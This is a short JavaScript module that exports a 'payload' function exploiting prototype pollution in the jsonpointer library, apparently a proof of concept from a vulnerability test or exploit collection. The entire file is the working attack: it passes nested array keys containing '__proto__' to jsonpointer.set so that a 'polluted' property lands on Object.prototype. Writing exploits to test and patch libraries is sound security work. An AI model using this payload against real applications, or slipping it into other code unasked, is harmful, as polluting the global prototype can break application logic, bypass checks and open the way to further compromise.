function getPayload() {
    const jsonpointer = require("jsonpointer");

    return {
        setPrototypePollution: function() {
            jsonpointer.set({}, [["proto"], ["__proto__"], "polluted"], "yes");
        }
    };
}

module.exports = { getPayload };